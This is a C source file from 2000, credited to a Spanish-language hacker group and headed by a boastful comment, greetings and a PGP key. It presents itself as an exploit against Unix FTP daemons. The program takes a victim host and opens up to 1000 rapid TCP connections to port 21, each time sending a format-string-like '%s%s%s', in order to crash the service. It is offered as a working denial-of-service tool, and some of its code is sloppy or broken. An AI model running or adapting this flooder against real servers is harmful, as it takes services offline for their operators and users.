/*
        .-=-=-=-=-=-=-=-=-=-=-.
       .| UnIx FtPd's ExPL01T |.
        `-=-=-=-=-=-=-=-=-=-=-'

    Mierda... lo que uno c0dea cuando no tiene nada que hacer eh! :)
    Esta mierda de exploit salio porque yo estaba armando un Socket TCP
    dentro de un bucle infinito haciendo connect() contra mi servicio
    FTP (wu-ftpd 2.6.0 jeje!) y luego de 100 connects() seguidos, la
    mierda de mi servicio se cayo! jaja X). Funciona con casi todos los
    Daemons de FTP que corren bajo cualquier Unix (iunics para los
    fr1ends!) porque ya lo he probado con varios sites que tienen FTP
    bajo Unix (wu, bero, pro).
    
    Compilacion: $ cc -o ufe -s unix-ftpexploit.c
    Uso: $ ./ufe www.sitiovictima.com
    
    Greetz to: Mis palz de Ezkracho (CA0S, Powertech, roots,
	       Polos, GiBa, BACH, im here!! in TV!!), mis
	       nuevos palz de RaZa MeXiCaNa (alt3kz_H3z, DeadSector,
	       dr_fdisk^, Nahual, Fatal, Yield, Yo_Soy, Vlad,
	       PsychicTV, Trovalz!!), y a todos aquellos
	       que me odian o me aman.

    esploit koded bai jelreiser

    [ Mierda codeada usando VI ]

    Exploit C0D3D by [Hellraiser] (Wed Jul 12 19:58:19 ART 2000)
	
    [Hellraiser] 
    RaZa MeXiCaNa HaCkErS TeAm
    URL: <http://www.raza-mexicana.org>
    MAIL: <hell@raza-mexicana.org>
	

	-----BEGIN PGP PUBLIC KEY BLOCK-----
	Version: GnuPG v1.0.1 (GNU/Linux)
	Comment: For info see http://www.gnupg.org
		
	mQGiBDkXREURBACBbSopFSKZj7a08MwtnWM+bNh00vOyZcDrn48FOnVpkICNr/mZ
	KnIihL6bffvnhqnIyn+jw6mM0+1nnk+NJTtaMErJ3BLVieqi2ch8VQmIB3i0y2m3
	GiPuV0T09kev4CKsRCukXRGOe9cwUNoJx2DtPzh/JkvLGBTomPw5CGkI6wCg3Cqv
	Pb5enFIYp+1JWIr6fwz33ccD/jNZ2qg9+yWMqhngfribETs4O6I3r72pwnjV7Xrb
	VXs/wAHS1DCJTyTGpZ+ZE14OIFJ+E5roxwbEunpjGwIyqaY9IgqldKAc/kch6GT/
	WCG/K+ysfzeP35DQNyx/OYpeKV9JjFB9CuDInicurx7xJfT8oZZvHNlJjdairjJP
	+h+4A/44ivT/cSCc21u39feZLkYysHpjjE6KV4sZcrZfrqBC7IYZNM9dqL7/8Cjq
	Y18604sdlj9KoQcaKiF7MFoaBzIf+RBBbm4qphMVPYAE5shucKH9GOUiSgLyS7cC
	CpWZBoLNcITqrBCYshohw0nzX+puvTYGqtgOXeYfBUSy1XMW2rRPSGVsbHJhaXNl
	ciAoTGxhdmUgcHVibGljYSBkZSBIZWxscmFpc2VyIC0gRXprcmFjaG8gVGVhbSkg
	PGhlbGxAZXprcmFjaG8uY29tLmFyPohWBBMRAgAWBQI5F0RGBAsKBAMDFQMCAxYC
	AQIXgAAKCRD7h95gg+C9gT+NAJ4vvFxz44IRn7dIiuq1vTEWkpxTwACglvuOTOTf
	vXRcTwJFQ6mib9sQN6i5AQ0EORdEWBAEAK9ULq9ydZitKM8T03h9Ah42ObBKT6pa
	XY8QgRWVQ/rEUnsU4ChsEELjWXiX4eSgeuNG/vIKLUw5fU0NSFxPXnJSLEXjd6zR
	PgxVfl10LH7XfZLlWhl98zFCcfiy+BaJm0uQGx+Zvr2kQMxR3sS9OKNUZU1eTRuW
	Qe9q0MWQh+0XAAMHBACLFoTfz7Q+B/hIsJmIcMio9AEQykH/lZ3Dcu/Z5/E4MDBh
	jOafEsSHh/mtGDFWeVhpNJPBFkKbPXlhDgz2zOqiTiHK4iYYVdwi60GBFVILtGYk
	BvTAGJOIByMnO1gXw7nM37xPDwLZbT6zTiR8aIiWLOypCfhwgH0+UgN6CctP4IhG
	BBgRAgAGBQI5F0RYAAoJEPuH3mCD4L2B1g8AoKPIFTH3q+l48NaikSD4tVCruYro
	AKDWaW3KuTg1JbACM6Qi0UsEqr42WA==
	=3G3D
	-----END PGP PUBLIC KEY BLOCK-----

*/	

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <netdb.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>

int main(int argc, char *argv[])
{
    int sck;
    int host;
    int veces;
    struct sockaddr_in conector;
    struct hostent *h;
    char port[]="21";

    if(argc != 2)
	{
	    printf("UnIx FtPd's ExPL01T\n");
	    printf("%s [host/ip]\n", argv[0]);
	    printf("-:( C0d3d by [Hellraiser] - <hell@raza-mexicana.org> ):-\n");
	    return(-1);
	}
	
    if((h=gethostbyname(argv[1])) == NULL)
	{
	    printf("UnIx FtPd's ExPL01T\n");
	    printf("El host/ip (%s) no puede ser resuelto.\n", argv[1]);
            printf("-:( C0d3d by [Hellraiser] - <hell@raza-mexicana.org> ):-\n");
	    return(-1);
        }

    host = inet_ntoa(*((struct in_addr*)h->h_addr)); 
	
    sck=socket(AF_INET, SOCK_STREAM, 0);
    conector.sin_family=AF_INET;
    conector.sin_port=htons(atoi(port));
    conector.sin_addr.s_addr=inet_addr(host);
    bzero(&(conector.sin_zero), 8);
    
    if((connect(sck, (struct sockaddr*)&conector, sizeof(conector))) < 0)
	{
	    printf("UnIx FtPd's ExPL01T\n");
	    printf("No se puede conectar a (%s).\n", argv[1]);
	    printf("-:( C0d3d by [Hellraiser] - <hell@raza-mexicana.org> ):-\n");
	    return(-1);
	}

    close(sck);

    printf("UnIx FtPd's ExPL01T\n");
    printf("Atacando a (%s)...\n", argv[1]);
    printf("Espera un poco!\n");
    
    for(veces=0; veces<1000; veces++)
	{
	    sck=socket(AF_INET, SOCK_STREAM, 0);
	    conector.sin_family=AF_INET;
	    conector.sin_port=htons(atoi(port));
	    conector.sin_addr.s_addr=inet_addr(host);
	    bzero(&(conector.sin_zero), 8);
	
	    if((connect(sck, (struct sockaddr*)&conector, sizeof(conector))) < 0)
		{
		    break;
		}
			
	    write(sck, "%s%s%s", 6);
	    close(sck);
	}

    printf("Exploit finalizad0 contra %s\n", argv[1]);
    printf("-:( C0d3d by [Hellraiser] - <hell@raza-mexicana.org> ):-\n");
    close(sck);
    return(0);
}
